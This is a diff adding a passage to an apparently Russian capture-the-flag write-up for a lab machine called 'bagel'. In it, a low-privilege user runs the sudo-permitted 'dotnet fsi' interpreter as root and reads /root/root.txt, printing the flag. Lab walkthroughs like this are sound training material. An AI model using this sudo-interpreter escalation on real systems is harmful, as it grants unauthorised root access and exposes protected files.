@@ -322,3 +322,15 @@ User developer may run the following commands on bagel:
 
 ```
 Видим, что папка без пароля и своими шалавливыми ручками лезем туда
+```
+[developer@bagel phil]$ sudo /usr/bin/dotnet fsi
+
+Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
+Copyright (c) Microsoft Corporation. All Rights Reserved.
+
+For help type #help;;
+
+> System.IO.File.ReadAllLines("/root/root.txt");;
+val it: string[] = [|"741ec7c35837bade6c91597060aa6d40"|]
+```
+![image](https://user-images.githubusercontent.com/77785989/235348359-4cad9323-9f12-42c8-8b9a-4da38187fb7a.png)
